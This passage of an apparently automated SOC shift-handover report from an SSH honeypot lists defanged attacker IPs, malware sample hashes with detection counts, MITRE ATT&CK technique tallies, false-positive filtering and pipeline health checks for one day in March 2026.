| `183.239.25[.]115` | 1 | 2026-03-15 02:37 | 2026-03-15 02:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-03-15 05:08 | 2026-03-15 05:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.99.131[.]197` | 1 | 2026-03-15 02:56 | 2026-03-15 02:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `196.29.34[.]170` | 1 | 2026-03-15 09:53 | 2026-03-15 09:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.199.94[.]79` | 1 | 2026-03-15 07:08 | 2026-03-15 07:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `2.55.70[.]124` | 1 | 2026-03-15 00:49 | 2026-03-15 00:49 | 5s | 0 | `T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-03-15 07:59 | 2026-03-15 08:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.223.146[.]164` | 1 | 2026-03-15 08:39 | 2026-03-15 08:39 | 14s | 0 | `T1592` | 🟢 LOW |
| `35.130.111[.]146` | 1 | 2026-03-15 00:14 | 2026-03-15 00:16 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.239.202[.]174` | 1 | 2026-03-15 11:43 | 2026-03-15 11:44 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.236.192[.]183` | 1 | 2026-03-15 06:18 | 2026-03-15 06:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-15 04:41 | 2026-03-15 04:41 | 26s | 0 | `T1592` | 🟢 LOW |
| `52.159.243[.]193` | 1 | 2026-03-15 05:26 | 2026-03-15 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.238.26[.]242` | 1 | 2026-03-15 10:26 | 2026-03-15 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.108[.]146` | 1 | 2026-03-15 01:05 | 2026-03-15 01:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.37.236[.]111` | 1 | 2026-03-15 08:46 | 2026-03-15 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `79.143.42[.]170` | 1 | 2026-03-15 01:33 | 2026-03-15 01:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.219.236[.]6` | 1 | 2026-03-15 02:15 | 2026-03-15 02:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.233.46[.]177` | 1 | 2026-03-15 11:18 | 2026-03-15 11:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.215.35[.]10` | 1 | 2026-03-15 10:13 | 2026-03-15 10:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-15 10:35 | 2026-03-15 10:35 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (9 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.55.70[.]124` | IL | Partner Communications Ltd. | **100** ⚠️ | 25 |
| `47.236.192[.]183` | SG | Alibaba Cloud LLC | **100** ⚠️ | 17 |
| `35.130.111[.]146` | US | Charter Communications LLC | **100** ⚠️ | 50 |
| `206.189.138[.]45` | IN | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `83.233.46[.]177` | SE | Bredband2 AB | **100** ⚠️ | 11 |
| `45.239.202[.]174` | BR | MXCONECT SERVICOS DE COMUNICACAO LTDA | **100** ⚠️ | 2 |
| `52.238.26[.]242` | US | Microsoft Corporation | **100** ⚠️ | 1 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `223.223.146[.]164` | IN | WISH NET PRIVATE LIMITED | **100** ⚠️ | 3 |
| `8.219.236[.]6` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 258 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 125 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 40 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (124 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 37 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 27 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 9 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 43 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 395 cases |
| Tool 34  | Credential Extractor        | ✅ 210 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 0 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 108 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 124 filtered (31.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 9 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 59 priority case(s) shown individually · 66 recon entry/entries in table (20 group(s) consolidating 166 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-15T12:48:39Z_
